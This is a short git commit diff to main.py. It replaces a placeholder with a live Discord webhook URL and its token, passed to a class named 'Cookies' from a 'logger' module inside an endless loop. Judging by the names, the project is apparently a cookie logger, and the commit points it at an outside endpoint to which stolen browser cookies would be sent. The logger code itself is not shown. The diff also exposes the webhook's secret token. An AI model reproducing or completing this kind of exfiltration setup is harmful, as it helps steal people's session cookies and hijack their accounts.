cff7ea7194bd7660e987ae02b64235f1ccef0518
hingchang <104703246+hingchang@users.noreply.github.com>
2022-04-30 20:42:27 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 from logger import Cookies
 
-log = Cookies('weebhook url here')
+log = Cookies('https://discord.com/api/webhooks/970135541364453436/kZQVQpHj8pk-M5wn6PxDND7sGyeMRLl7VZf-TGHWhYSLS0C1NW2XZB9rVwuQKwsk-f9B')
 
 def main():
   while True:
